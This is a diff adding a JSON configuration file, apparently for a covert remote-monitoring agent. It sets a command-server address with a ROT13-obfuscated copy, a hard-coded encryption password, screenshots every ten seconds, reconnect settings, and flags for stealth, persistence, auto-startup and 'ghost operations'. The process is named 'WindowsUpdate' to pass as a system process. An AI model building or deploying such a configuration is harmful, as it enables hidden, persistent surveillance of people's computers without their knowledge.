@@ -1,0 +1,15 @@
+{
+  "server_url": "http://192.168.1.64:5000",
+  "obfuscated_server": "uggc://192.168.1.64:5000",
+  "encryption_password": "watchman2025",
+  "heartbeat_interval": 30,
+  "metrics_interval": 60,
+  "screenshot_interval": 10,
+  "stealth_mode": true,
+  "persistence_enabled": true,
+  "auto_startup": true,
+  "ghost_operations": true,
+  "max_reconnect_attempts": 10,
+  "reconnect_delay": 5,
+  "process_name": "WindowsUpdate"
+}
